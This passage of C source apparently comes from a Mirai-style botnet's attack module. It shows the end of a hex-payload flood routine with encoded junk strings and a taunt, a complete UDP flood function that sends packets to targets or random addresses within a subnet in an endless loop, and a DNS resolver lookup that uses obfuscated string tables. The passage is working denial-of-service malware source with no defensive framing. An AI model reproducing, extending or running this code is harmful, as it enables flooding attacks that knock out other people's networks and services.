        "\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf",
        "\x53\x65\x6c\x66\x20\x52\x65\x70\x20\x46\x75\x63\x6b\x69\x6e\x67\x20\x4e\x65\x54\x69\x53\x20\x61\x6e\x64\x20\x54\x68\x69\x73\x69\x74\x79\x20\x30\x6e\x20\x55\x72\x20\x46\x75\x43\x6b\x49\x6e\x47\x20\x46\x6f\x52\x65\x48\x65\x41\x64\x20\x57\x65\x20\x42\x69\x47\x20\x4c\x33\x33\x54\x20\x48\x61\x78\x45\x72\x53\x0a",
        "\xaf\x81\xea\x9c\xdd\x43\x81\x82\x06\x14\x01\x2c\x40\x4b\x79\xcf\xb8",
        "\x09\xbb\x30\x2c\x16\xd4\xbe\x0d\x26\xc3\x00\x83\x84",
        "\x6d\xbe\x27\xaa\xcc\x66\x15\x09\x60\x13\x00\x09\x80\x37\x80\x04\x48\x0b\x59\x4b\x6b\xdf\xc2\xdc\x09\x2d\xca\x9b\x48\x9b\xf8\x48\x02\xf4\x9c\xee\xba\xcf\x82\x18\x8c\xa2\x5a\x76\xbd\x5b\xfb\x87\x54\x70\x97\xcb\x76\x5f\xd7\x04\xa0\x01\xd6",
        pkts[i]
        };
        if (a >= 50)
        {           
            hexstring = randhex[rand() % (sizeof(randhex) / sizeof(char *))];
            for (i = 0; i < targs_len; i++)
            {                               
                //char *data = pkts[i];
                //if (data_rand)
                //rand_str(data, data_len);
                send(fds[i], hexstring, data_len, MSG_NOSIGNAL);
            }
            a = 0;
        }
        a++;       
    }   
}



void attack_udp_plain(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
#ifdef DEBUG
    printf("in udp plain\n");
#endif

    int i;
    char **pkts = calloc(targs_len, sizeof (char *));
    int *fds = calloc(targs_len, sizeof (int));
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    uint16_t data_minlen = attack_get_opt_int(opts_len, opts, ATK_OPT_MIN_SIZE, 1); //minlen
    uint16_t data_maxlen = attack_get_opt_int(opts_len, opts, ATK_OPT_MAX_SIZE, 1); //maxlen
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    struct sockaddr_in bind_addr = {0};
    uint8_t repeat = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_REPEAT, 0);

    if (sport == 0xffff)
    {
        sport = htons(10000 + rand_next() % (65535 - 10000));
    } else {
        sport = htons(sport);
    }

    if (data_minlen == 1 && data_maxlen == 1)
    {
        #ifdef DEBUG
            printf("min and max len not set, using len (len=%d)\n", data_len);
        #endif
    } else {
        data_len = data_minlen + rand_next() % (data_maxlen - data_minlen);
        // data_len = rand() % data_maxlen + data_minlen;;
        #ifdef DEBUG
            printf("using random len %d\n", data_len);
        #endif
    }

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;
        char *data;

        pkts[i] = calloc(65535, sizeof (char));

        if (dport == 0xffff)
            targs[i].sock_addr.sin_port = 10000 + rand_next() % (65535 - 10000);
        else
            targs[i].sock_addr.sin_port = htons(dport);

        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
        {
#ifdef DEBUG
            printf("Failed to create udp socket. Aborting attack\n");
#endif
            return;
        }

        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = 0;

        if (bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("Failed to bind udp socket.\n");
#endif
        }

        // For prefix attacks
        if (targs[i].netmask < 32)
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

        if (connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("Failed to connect udp socket.\n");
#endif
        }
    }

#ifdef DEBUG
    printf("kititza\n");
#endif

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *data = pkts[i];

            // Randomize packet content?
            if (data_rand)
                rand_str(data, data_len);

#ifdef DEBUG
            errno = 0;
            if (repeat == 0) {
                if (send(fds[i], data, data_len, MSG_NOSIGNAL) == -1)
                {
                    printf("send failed: %d\n", errno);
                } else {
                    printf("sending attack with len=%d\n", data_len);
                    printf(".\n");
                }
            } else {
                int r = 0;
                for (r = 0; r < repeat; r++)
                {
                    if (send(fds[i], data, data_len, MSG_NOSIGNAL) == -1)
                    {
                        printf("send failed: %d\n", errno);
                    } else {
                        printf("sending attack with len=%d\n", data_len);
                        printf(".\n");
                    }
                }
            }
#else
            if (repeat == 0) {
                send(fds[i], data, data_len, MSG_NOSIGNAL);
            } else {
                int r = 0;
                for (r = 0; r < repeat; r++)
                {
                    send(fds[i], data, data_len, MSG_NOSIGNAL);
                }
            }
#endif
        }
#ifdef DEBUG
            break;
            if (errno != 0)
                printf("errno = %d\n", errno);
#endif
    }
}

static ipv4_t get_dns_resolver(void)
{
    int fd;

    table_unlock_val(TABLE_ATK_RESOLVER);
    fd = open(table_retrieve_val(TABLE_ATK_RESOLVER, NULL), O_RDONLY);
    table_lock_val(TABLE_ATK_RESOLVER);
    if (fd >= 0)
    {
        int ret, nspos;
        char resolvbuf[2048];

        ret = read(fd, resolvbuf, sizeof (resolvbuf));
        close(fd);
        table_unlock_val(TABLE_ATK_NSERV);
        nspos = util_stristr(resolvbuf, ret, table_retrieve_val(TABLE_ATK_NSERV, NULL));
        table_lock_val(TABLE_ATK_NSERV);
        if (nspos != -1)
        {
            int i;
            char ipbuf[32];
            BOOL finished_whitespace = FALSE;
            BOOL found = FALSE;

            for (i = nspos; i < ret; i++)
            {
                char c = resolvbuf[i];

                // Skip leading whitespace
                if (!finished_whitespace)
                {
                    if (c == ' ' || c == '\t')
                        continue;
                    else
                        finished_whitespace = TRUE;
                }

                // End if c is not either a dot or a number
                if ((c != '.' && (c < '0' || c > '9')) || (i == (ret - 1)))
                {
                    util_memcpy(ipbuf, resolvbuf + nspos, i - nspos);
                    ipbuf[i - nspos] = 0;
                    found = TRUE;
                    break;
                }
            }

            if (found)
            {
#ifdef DEBUG
                printf("Found local resolver: '%s'\n", ipbuf);
#endif
                return inet_addr(ipbuf);
            }
        }
    }

    switch (rand_next() % 4)
    {
    case 0:
        return INET_ADDR(8,8,8,8);
    case 1:
        return INET_ADDR(74,82,42,42);
    case 2:
        return INET_ADDR(64,6,64,6);
    case 3:
        return INET_ADDR(4,2,2,2);
    }
}
